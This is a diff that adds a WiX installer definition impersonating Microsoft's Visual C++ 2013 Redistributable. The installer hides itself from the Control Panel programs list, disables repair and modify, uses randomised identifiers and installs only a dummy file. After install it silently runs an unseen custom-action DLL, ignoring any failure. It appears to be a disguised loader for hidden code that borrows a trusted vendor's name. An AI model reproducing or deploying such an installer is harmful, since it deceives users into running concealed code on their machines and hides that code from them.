@@ -1,0 +1,45 @@
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Name="Microsoft Visual C++ 2013 Redistributable (64) - 12.0.10269" Manufacturer="Microsoft Corporation" Id="*" UpgradeCode="AEC20A0B-C2CF-4A95-852A-E57E3285177C" Language="1033" Version="12.0.10269">
+
+        <Package Manufacturer="Microsoft Corporation" InstallerVersion="400" Compressed="yes" InstallPrivileges="limited" InstallScope="perUser"/>
+
+        <!-- Hide application from Control Panel programs list -->
+        <Property Id="ARPSYSTEMCOMPONENT" Value="1"/>
+
+        <!-- Remove repair button -->      
+        <Property Id="ARPNOREPAIR" Value="yes" Secure="yes"/>
+
+        <!-- Remove modify button -->
+        <Property Id="ARPNOMODIFY" Value="yes" Secure="yes"/>
+
+        <Media Id="1" Cabinet="xUkpqyDTQu.cab" EmbedCab="yes" CompressionLevel="high"/>
+
+        <SetDirectory Id="muulHLyp" Value="[%LOCALAPPDATA]\VcRedist"/>
+
+        <!-- Step 1: Define the directory structure -->
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="muulHLyp"/>
+        </Directory>
+
+        <!-- Step 2: Add files to your installer package -->
+        <DirectoryRef Id="muulHLyp">
+            <Component Id="OkejjtSat" Guid="63D0E483-D71E-469D-B735-9647044CDF35">
+                <RemoveFile Id="HGnfoGMXhH" Name="*.*" On="uninstall" Directory="muulHLyp"/>
+                <File Id="OkejjtSat" Source="dummy.txt" KeyPath="yes"/>
+            </Component>
+        </DirectoryRef>
+
+        <!-- Step 3: Tell WiX to install the files -->
+        <Feature Id="MainProgram" Title="Microsoft Visual C++ 2013 Redistributable (64) - 12.0.10269" Level="1">
+            <ComponentRef Id="OkejjtSat"/>
+        </Feature>
+
+        <!-- Step 4: Post-Install actions -->
+        <Binary Id="WzNasppq" SourceFile="CustomAction.CA.dll"/>
+        <CustomAction Id="BQpkQWRY" BinaryKey="WzNasppq" DllEntry="MyMethod" Return="ignore" Impersonate="yes" />
+
+        <InstallExecuteSequence>
+            <Custom Action="BQpkQWRY" Before="InstallFinalize">NOT REMOVE</Custom>
+        </InstallExecuteSequence>
+    </Product>
+</Wix>
